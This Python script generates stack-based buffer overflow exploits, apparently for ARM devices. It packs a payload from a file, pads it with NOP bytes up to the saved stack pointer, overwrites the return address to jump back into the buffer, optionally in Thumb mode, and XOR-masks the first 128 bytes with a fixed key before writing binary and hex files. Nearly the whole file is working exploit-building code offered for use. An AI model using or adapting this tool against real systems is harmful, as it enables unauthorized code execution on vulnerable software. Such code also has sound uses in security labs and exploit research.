import struct
import argparse
import os

def parse_payload_file(payload_file, endian):
    """
    Parses a text file containing the payload instructions.

    Parameters:
        payload_file (str): Path to the text file containing the payload instructions.
        endian (str): Endianness ("little" or "big").
    
    Returns:
        list: The payload instructions as 16-bit or 32-bit values.
    """
    payload = []
    endian_format = "<" if endian == "little" else ">"
    
    with open(payload_file, "r") as f:
        lines = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        
        # Detect if payload is inline or line-by-line
        if len(lines) == 1 and " " in lines[0]:
            # Inline payload (space-separated hex values on one line)
            tokens = lines[0].split()
            for token in tokens:
                try:
                    value = int(token, 16)
                    payload.append(value)
                except ValueError:
                    raise ValueError(f"Invalid inline payload token: '{token}'")
        else:
            # Line-by-line payload
            for line in lines:
                try:
                    value = int(line, 16)
                    payload.append(value)
                except ValueError:
                    raise ValueError(f"Invalid payload line: '{line}'")
    
    print(f"Parsed payload: {[f'0x{instr:04x}' for instr in payload]}")
    return payload

def create_exploit(payload, buffer_address, saved_sp, endian, output_file, hex_file, mask=None, block_size=128):
    """
    Creates a binary exploit to overflow a stack-based buffer and execute a payload.
    Writes both binary and masked `.hex` files.

    Parameters:
        payload (list): The payload instructions.
        buffer_address (int): Address of the buffer in memory.
        saved_sp (int): Stack pointer address of the previous frame.
        endian (str): Endianness ("little" or "big").
        output_file (str): Filename for the binary exploit.
        hex_file (str): Filename for the .hex file.
        mask (bytes): The key mask to apply to the first 128 bytes.
    """
    endian_format = "<" if endian == "little" else ">"

    # Calculate the full buffer size
    buffer_size = saved_sp - buffer_address
    if buffer_size <= 0:
        raise ValueError("Saved SP must be greater than the buffer address.")

    # Convert payload to binary
    payload_binary = b""
    for instr in payload:
        if instr <= 0xFF:
            fmt = endian_format + "B"
        elif instr <= 0xFFFF:
            fmt = endian_format + "H"
        elif instr <= 0xFFFFFFFF:
            fmt = endian_format + "I"
        else:
            raise ValueError(f"Invalid payload value: {instr} (too large)")
        payload_binary += struct.pack(fmt, instr)

    # Calculate padding
    padding_size = buffer_size - len(payload_binary) - 4  # 4 bytes for the return address
    if padding_size < 0:
        raise ValueError("Payload size exceeds available buffer space.")

    # Fill padding with NOPs
    nop = 0xFF  # Non-Thumb NOP value
    padding = b"".join([struct.pack(endian_format + "B", nop)] * padding_size)

    # Address to redirect execution to
    redirect_address = buffer_address
    return_address_binary = struct.pack(endian_format + "I", redirect_address)

    # Combine padding, payload, and return address
    exploit_binary = payload_binary + padding + return_address_binary

    # Apply mask to first block_size bytes if mask is provided
    if mask is not None:
        masked_data = apply_mask(exploit_binary[:block_size], mask, block_size=block_size) + exploit_binary[block_size:]
    else:
        masked_data = exploit_binary

    # Write masked data to a .hex file
    with open(hex_file, "w") as hex_out:
        for i in range(0, len(masked_data), 16):
            line = masked_data[i:i+16]
            hex_out.write(" ".join(f"{byte:02X}" for byte in line) + "\n")
    
    print(f"Masked data written to {hex_file}.")

    # Write binary exploit
    with open(output_file, "wb") as bin_out:
        bin_out.write(masked_data)
    
    print(f"Exploit successfully created and written to {output_file}.")


def create_exploit_thumb(payload, buffer_address, saved_sp, endian, output_file, hex_file, mask=None, block_size=128):
    """
    Creates a binary exploit for Thumb mode and writes both binary and masked `.hex` files.

    Parameters:
        payload (list): The payload instructions.
        buffer_address (int): Address of the buffer in memory.
        saved_sp (int): Stack pointer address of the previous frame.
        endian (str): Endianness ("little" or "big").
        output_file (str): Filename for the binary exploit.
        hex_file (str): Filename for the .hex file.
        mask (bytes): The key mask to apply to the first 128 bytes.
    """
    endian_format = "<" if endian == "little" else ">"

    # Calculate the full buffer size
    buffer_size = saved_sp - buffer_address
    if buffer_size <= 0:
        raise ValueError("Saved SP must be greater than the buffer address.")

    # Convert payload to binary
    payload_binary = b""
    for instr in payload:
        if instr <= 0xFF:
            fmt = endian_format + "B"
        elif instr <= 0xFFFF:
            fmt = endian_format + "H"
        elif instr <= 0xFFFFFFFF:
            fmt = endian_format + "I"
        else:
            raise ValueError(f"Invalid payload value: {instr} (too large)")
        payload_binary += struct.pack(fmt, instr)

    # Calculate padding
    padding_size = buffer_size - len(payload_binary) - 4  # 4 bytes for the return address
    if padding_size < 0:
        raise ValueError("Payload size exceeds available buffer space.")

    # Fill padding with Thumb NOPs
    nop = 0xBF  # Thumb NOP value
    padding = b"".join([struct.pack(endian_format + "H", nop)] * (padding_size // 2))

    # Thumb return address
    thumb_return_address = buffer_address | 1  # Set LSB for Thumb mode
    return_address_binary = struct.pack(endian_format + "I", thumb_return_address)

    # Combine padding, payload, and return address
    exploit_binary = payload_binary + padding + return_address_binary

    # Apply mask to first block_size bytes if mask is provided
    if mask is not None:
        masked_data = apply_mask(exploit_binary[:block_size], mask, block_size=block_size) + exploit_binary[block_size:]
    else:
        masked_data = exploit_binary

    # Write masked data to a .hex file
    with open(hex_file, "w") as hex_out:
        for i in range(0, len(masked_data), 16):
            line = masked_data[i:i+16]
            hex_out.write(" ".join(f"{byte:02X}" for byte in line) + "\n")
    
    print(f"Masked data written to {hex_file}.")

    # Write binary exploit
    with open(output_file, "wb") as bin_out:
        bin_out.write(masked_data)
    
    print(f"Exploit successfully created for Thumb mode and written to {output_file}.")



def apply_mask(data, mask=None, block_size=128):
    """
    Applies a mask to the given data. If no mask is provided, returns the data unchanged.

    Parameters:
        data (bytes): The data to process.
        mask (bytes or None): The key mask to apply. If None, no mask is applied.
        block_size (int): The block size to apply the mask over.
    
    Returns:
        bytes: The masked data, or the original data if no mask is provided.
    """
    if mask is None:
        return data  # No masking
    
    masked_data = bytearray(len(data))
    key_length = len(mask)
    
    for i in range(block_size):
        masked_data[i] = data[i] ^ mask[i % key_length]
    
    return bytes(masked_data)



def parsing_args():
    """
    Parse command-line arguments.

    Returns:
        Namepsapce: The parsed arguments.
    """
    parser = argparse.ArgumentParser(
        description="Generate a stack-based exploit binary file for a vulnerable application."
    )
    parser.add_argument("payload_file", help="Path to the text file containing the payload instructions.")
    parser.add_argument("buffer_address", type=lambda x: int(x, 16), help="Address of the buffer in memory (hex).")
    parser.add_argument("saved_sp", type=lambda x: int(x, 16), help="Previous stack pointer address (hex).")
    parser.add_argument(
        "--endian", choices=["little", "big"], default="little", help="Endianness of the system (default: little)."
    )
    parser.add_argument(
        "--output", default="exploit.bin", help="Filename for the output binary exploit (default: exploit.bin)."
    )
    parser.add_argument("--thumb", action="store_true", help="Enable Thumb mode for ARM.")
    
    args = parser.parse_args()
    return args


if __name__ == "__main__":
    # parse command-line arguments
    args = parsing_args()
    
    # Validate payload file
    if not os.path.exists(args.payload_file):
        raise FileNotFoundError(f"Payload file '{args.payload_file}' does not exist.")
    
    # Parse payload and generate exploit
    payload = parse_payload_file(args.payload_file, args.endian)

    # Handle masking
    block_size = 128
    mask = bytes([0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42])
    # mask = None

    # Create the exploit binary based on thumb mode
    if args.thumb:
        create_exploit_thumb(
            payload=payload, 
            buffer_address=args.buffer_address, 
            saved_sp=args.saved_sp, 
            endian=args.endian, 
            output_file=args.output+'.bin',
            hex_file=args.output+'.hex',
            mask=mask, block_size=block_size
            )
    else:
        create_exploit(
            payload=payload, 
            buffer_address=args.buffer_address, 
            saved_sp=args.saved_sp, 
            endian=args.endian, 
            output_file=args.output+'.bin', 
            hex_file=args.output+'.hex',
            mask=mask, block_size=block_size
            )
